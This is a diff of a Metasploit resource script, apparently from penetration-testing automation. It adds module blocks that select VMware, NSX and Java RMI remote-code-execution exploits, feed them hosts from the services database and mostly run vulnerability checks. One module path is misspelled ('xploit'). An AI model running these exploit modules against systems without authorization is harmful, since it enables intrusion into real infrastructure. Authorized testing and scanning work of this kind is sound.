@@ -375,11 +375,28 @@ run
 sleep 5
 
 echo "VMware vRealize Operations (vROps) Manager SSRF RCE"
-echo "MSF ESX vROPS" >>/root/output/runtime.txt
+echo "MSF ESX vROPS SSRF RCE" >>/root/output/runtime.txt
 date >>/root/output/runtime.txt
 use exploit/linux/http/vmware_vrops_mgr_ssrf_rce
 services -S vmware -R
 set srvport 8444
+check
+sleep 5
+
+echo "VMware vRealize Log Insight Unauthenticated RCE "
+echo "MSF ESX vRLI RCE" >>/root/output/runtime.txt
+date >>/root/output/runtime.txt
+use exploit/linux/http/vmware_vrli_rce
+services -S vmware -R
+set srvport 8445
+check
+sleep 5
+
+echo "VVMWare Aria Operations for Networks RCE "
+echo "MSF ESX vRNI RCE" >>/root/output/runtime.txt
+date >>/root/output/runtime.txt
+use xploit/linux/http/vmware_vrni_rce_cve_2023_20887
+services -S vmware -R
 check
 sleep 5
 
@@ -420,6 +437,14 @@ echo "VMware Workspace One CVE-2022-22954"
 echo "MSF VMware Workspace One check" >>/root/output/runtime.txt
 date >>/root/output/runtime.txt
 use exploit/linux/http/vmware_workspace_one_access_cve_2022_22954
+services -S vmware -R
+check
+sleep 5
+
+echo "VVMware NSX Manager XStream RCE"
+echo "MSF VMware NSX Manager XStream RCE " >>/root/output/runtime.txt
+date >>/root/output/runtime.txt
+use exploit/linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144 
 services -S vmware -R
 check
 sleep 5
@@ -618,7 +643,7 @@ run
 sleep 5
 
 spool /root/output/msf/tomcat.txt
-echo "Tomcat Ghostcat"
+echo "###Tomcat###"
 
 echo "MSF Tomcat Ghostcat" >>/root/output/runtime.txt
 date >>/root/output/runtime.txt
@@ -670,6 +695,23 @@ sleep 5
 set RPORT 8443
 set SSL true
 run
+sleep 5
+
+spool /root/output/msf/java.txt
+echo "###Java###"
+
+echo "Java RMI RCE"
+echo "MSF Java RMI RCE" >>/root/output/runtime.txt
+date >>/root/output/runtime.txt
+use exploit/multi/misc/java_rmi_server
+set RPORT 1099
+set SSL false
+set SRVPORT 8088
+services -S Java -R
+check
+sleep 5
+set RPORT 9000
+check
 sleep 5
 
 spool /root/output/msf/vnc.txt
